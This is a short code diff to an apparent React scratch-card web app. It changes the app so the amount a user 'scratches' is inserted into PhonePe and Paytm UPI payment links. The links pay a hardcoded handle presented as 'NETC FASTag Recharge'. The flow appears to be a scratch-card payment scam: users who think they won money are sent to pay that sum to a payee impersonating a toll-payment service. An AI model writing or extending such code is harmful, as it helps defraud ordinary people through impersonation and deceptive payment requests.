@@ -5,17 +5,19 @@ import PopUp from "./ui/PopUp";
 const App = () => {
   const [isScratchCleared, setIsScratchCleared] = useState(false);
   const [isPopupOpen, setIsPopupOpen] = useState(false);
+  const [scratchAmount, setScratchAmount] = useState(0);
 
-  const handleScratchComplete = () => {
+  const handleScratchComplete = (amount) => {
     setIsScratchCleared(true);
+    setScratchAmount(amount);
   };
 
   const handleSelect = (method) => {
     const PHONEPE_URL =
-  "phonepe://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04";
+  `phonepe://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&am=${scratchAmount}&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04`;
 
 const PAYTM_URL =
-  "paytmmp://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04";
+  `paytmmp://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&am=${scratchAmount}&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04`;
 
     if (method === "phonepe") {
       window.location.href = PHONEPE_URL;
@@ -45,7 +47,7 @@ const PAYTM_URL =
         }}
       />
 
-      <PopUp isOpen={isPopupOpen} onSelect={handleSelect} />
+      <PopUp isOpen={isPopupOpen} onSelect={handleSelect} amount={scratchAmount} />
     </div>
   );
 };
